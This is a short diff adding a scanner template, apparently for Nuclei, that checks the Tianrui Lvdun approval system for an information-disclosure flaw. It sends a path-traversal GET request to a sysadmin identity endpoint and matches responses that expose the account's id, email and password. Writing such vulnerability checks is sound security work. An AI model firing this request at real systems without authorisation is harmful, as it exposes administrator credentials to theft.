@@ -1,0 +1,28 @@
+id: tianrui-sysadmin-Information-disclosure
+
+info:
+  name: 天锐绿盾审批系统 sysadmin 信息泄露漏洞
+  author: xxx
+  severity: medium
+  tags: Information disclosure
+
+http:
+  - raw:
+      - |
+        GET /trwfe/service/../ws/identity/user/sysadmin HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"id":'
+          - '"lastName":'
+          - '"email":'
+          - '"password":'
+        condition: and
+      - type: status
+        status: 
+          - 200
